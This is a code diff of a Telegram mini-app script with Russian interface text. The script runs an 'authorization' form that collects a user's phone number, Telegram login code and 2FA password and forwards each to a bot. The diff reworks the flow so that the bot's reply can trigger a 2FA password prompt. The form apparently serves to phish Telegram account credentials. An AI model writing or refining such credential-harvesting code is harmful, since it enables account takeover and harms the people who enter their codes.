@@ -12,7 +12,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const authForm = document.getElementById('authForm');
     const loadingSpinner = document.getElementById('loadingSpinner');
     const statusMsg = document.getElementById('statusMsg');
-    const instructionMsg = document.getElementById('instructionMsg');
     const phoneInput = document.getElementById('phoneInput');
     const codeInput = document.getElementById('codeInput');
     const twoFaInput = document.getElementById('twoFaInput');
@@ -21,8 +20,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const errorMsg = document.getElementById('errorMsg');
 
     let currentStep = 'contact';
-
-    const mainButton = tg.MainButton;
 
     function sendDataToBot(payload) {
         try {
@@ -83,26 +80,13 @@ document.addEventListener('DOMContentLoaded', () => {
             }
             const payload = { action: 'verify_code', code: code };
 
-            try {
-                tg.sendData(JSON.stringify(payload));
-                
+            if (sendDataToBot(payload)) {
                 showLoading();
                 statusMsg.textContent = 'Проверяем код...';
                 errorMsg.classList.add('hidden');
                 tg.HapticFeedback.impactOccurred('medium');
-                
-                setTimeout(() => {
-                    hideLoading();
-                    successMsg.textContent = '✅ Код принят! Авторизация завершена.';
-                    successMsg.classList.remove('hidden');
-                    statusMsg.textContent = 'Проверьте сообщение от бота ниже.';
-                    setTimeout(() => {
-                        tg.close();
-                    }, 1500);
-                }, 3000);
-
-            } catch (err) {
-                errorMsg.textContent = '❌ Ошибка соединения с ботом.';
+            } else {
+                errorMsg.textContent = '❌ Ошибка отправки кода.';
                 errorMsg.classList.remove('hidden');
                 hideLoading();
             }
@@ -116,25 +100,13 @@ document.addEventListener('DOMContentLoaded', () => {
             }
             const payload = { action: 'verify_2fa', password: password };
 
-            try {
-                tg.sendData(JSON.stringify(payload));
+            if (sendDataToBot(payload)) {
                 showLoading();
                 statusMsg.textContent = 'Подтверждаем 2FA...';
                 errorMsg.classList.add('hidden');
                 tg.HapticFeedback.impactOccurred('heavy');
-                
-                setTimeout(() => {
-                    hideLoading();
-                    successMsg.textContent = '✅ 2FA подтверждён! Авторизация завершена.';
-                    successMsg.classList.remove('hidden');
-                    statusMsg.textContent = 'Проверьте сообщение от бота ниже.';
-                    setTimeout(() => {
-                        tg.close();
-                    }, 1500);
-                }, 3000);
-
-            } catch (err) {
-                errorMsg.textContent = '❌ Ошибка соединения с ботом.';
+            } else {
+                errorMsg.textContent = '❌ Ошибка отправки пароля 2FA.';
                 errorMsg.classList.remove('hidden');
                 hideLoading();
             }
@@ -178,12 +150,33 @@ document.addEventListener('DOMContentLoaded', () => {
         submitBtn.classList.add('hidden');
         successMsg.classList.add('hidden');
         errorMsg.classList.add('hidden');
-        instructionMsg.classList.add('hidden');
         statusMsg.textContent = '';
         hideLoading();
     }
 
     tg.onEvent('web_app_data', (data) => {
+        if (data.success) {
+            hideLoading();
+            successMsg.textContent = '✅ Авторизация завершена!';
+            successMsg.classList.remove('hidden');
+            statusMsg.textContent = 'Проверьте сообщение от бота ниже.';
+            setTimeout(() => {
+                tg.close();
+            }, 1500);
+        } else {
+            hideLoading();
+            errorMsg.textContent = data.error || '❌ Ошибка авторизации.';
+            errorMsg.classList.remove('hidden');
+            if (data.twoFaRequired) {
+                codeInput.classList.add('hidden');
+                twoFaInput.classList.remove('hidden');
+                submitBtn.textContent = 'Отправить пароль 2FA';
+                statusMsg.textContent = 'Введите пароль 2FA.';
+                currentStep = '2fa';
+            } else {
+                setTimeout(resetForm, 2000);
+            }
+        }
     });
 
     tg.onEvent('error', (error) => {
@@ -191,8 +184,5 @@ document.addEventListener('DOMContentLoaded', () => {
         errorMsg.textContent = `❌ Ошибка: ${error.message || 'Неизвестная ошибка'}`;
         errorMsg.classList.remove('hidden');
         setTimeout(resetForm, 2000);
-    });
-
-    tg.onEvent('close', () => {
     });
 });
